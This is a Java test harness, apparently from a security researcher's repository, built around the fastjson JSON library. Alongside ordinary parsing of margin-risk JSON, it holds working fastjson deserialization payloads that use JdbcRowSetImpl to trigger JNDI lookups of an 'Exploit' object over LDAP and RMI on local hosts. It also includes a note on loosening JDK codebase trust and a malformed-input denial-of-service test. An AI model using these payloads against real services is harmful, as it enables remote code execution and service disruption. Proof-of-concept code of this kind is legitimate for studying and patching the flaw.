package com.lyhistory.rce.fastjson.rmi_jndi;

import java.io.Serializable;
import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.List;
import java.util.Map;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.lyhistory.rce.fastjson.ParseObject;
import com.lyhistory.rce.fastjson.TargetObj;
import com.lyhistory.rce.fastjson.TargetObjComplex;

/**
 * 
 * @author yue.liu
 * Test Method 1
 */
public class AttackerPayload {
	
	

	public static void main(String[] argv)
			throws NamingException, MalformedURLException, RemoteException, NotBoundException {
		//verifyRmi(); // verify rmi work or not
		//testJdbcRowSetImpl();
		//testDOS();
		
		String test="{\"CNH\":{\"NetOptionValue\":0,\"SpanInterComCredit\":0,\"SpanIntraComSpread\":0,\"SpanRisk\":0,\"SpanScanRisk\":0,\"SpanShortOptionMinimum\":0,\"SpanSpotMonthCharge\":0},\"USD\":{\"NetOptionValue\":0,\"SpanInterComCredit\":0,\"SpanIntraComSpread\":0,\"SpanRisk\":156200,\"SpanScanRisk\":156200,\"SpanShortOptionMinimum\":0,\"SpanSpotMonthCharge\":0},\"message\":\"\",\"return\":true}";
		String test2="{\"items\":[{\"ccy\":\"CNH\",\"NetOptionValue\":0,\"SpanInterComCredit\":0,\"SpanIntraComSpread\":0,\"SpanRisk\":0,\"SpanScanRisk\":0,\"SpanShortOptionMinimum\":0,\"SpanSpotMonthCharge\":0},{\"ccy\":\"USD\",\"NetOptionValue\":0,\"SpanInterComCredit\":0,\"SpanIntraComSpread\":0,\"SpanRisk\":156200,\"SpanScanRisk\":156200,\"SpanShortOptionMinimum\":0,\"SpanSpotMonthCharge\":0}],\"message\":\"lll\",\"return\":true}";
		JSONObject obj = JSON.parseObject(test);
		Map<String,Object> map = obj.getInnerMap();
		for(Map.Entry<String,Object> entry: map.entrySet()) {
			if(entry.getKey().contains("USD")||entry.getKey().contains("CNH")) {
				TargetObj targetObj=JSON.parseObject(entry.getValue().toString(),TargetObj.class);
				System.out.println("targetObj:"+targetObj.toString());
			}else if(entry.getKey().equals("return")) {
				String result=entry.getValue().toString();
				System.out.println("return:"+result);
			}
		}
		JSONObject obj2 = JSON.parseObject(test2);
		TargetObjComplex target = JSON.parseObject(test2, TargetObjComplex.class);
		
		JSONArray array = JSON.parseArray(test);
	}
	public static void testDOS() {

		//JSON.parse("[{\"a\":\"a\\x]");
		JSON.parseObject("{\"topics\":\"a\",\"oper\":\"b\\x",ParseObject.class);
	}
	public static void verifyRmi() throws NamingException, MalformedURLException, RemoteException, NotBoundException {
		Context context = new InitialContext();
		Object obj = context.lookup("rmi://127.0.0.1/Exploit");
		// Object obj = Naming.lookup("rmi://127.0.0.1/Exploit");
		System.out.println("obj:" + obj);
	}

	public static void testJdbcRowSetImpl() {

		// LADP
		String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\","
				+ " \"autoCommit\":true}";
		// RMI
		// >=JDK 8u121 need this setting
		// System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true}";
		JSONObject.parseObject(payload2);
	}
	
	
}
